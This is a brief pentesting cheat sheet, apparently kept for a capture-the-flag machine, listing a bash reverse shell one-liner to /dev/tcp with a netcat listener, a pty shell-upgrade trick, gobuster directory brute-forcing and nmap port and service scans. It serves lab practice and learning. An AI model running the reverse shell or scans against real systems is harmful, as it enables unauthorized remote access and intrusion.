# Some helpers 



Creating a reverse shell 

```sh 
# On the victim machine 

bash -c 'bash -i >& /dev/tcp/<ip-address>/<port> 0>&1')

# On the attacker machine 
nc -lnvp <port>
```



Interactive shell
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg #required to bring the shell to the foreground 

export TERM=xterm #Now you can actually clear the screen 
```







# Directory busing
gobuster dir -u http://<ip-address> -w /opt/SecList/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.out

# Evaluating Ports
nmap -p- --min-rate=1000 -v -oA nmap/knife <ip-address>

# With the discoverd ports check for servises, versions and output as gnmap, nmap and xml
nmap -sC -sV -oA nmap/knife <ip-address> -p 22,80
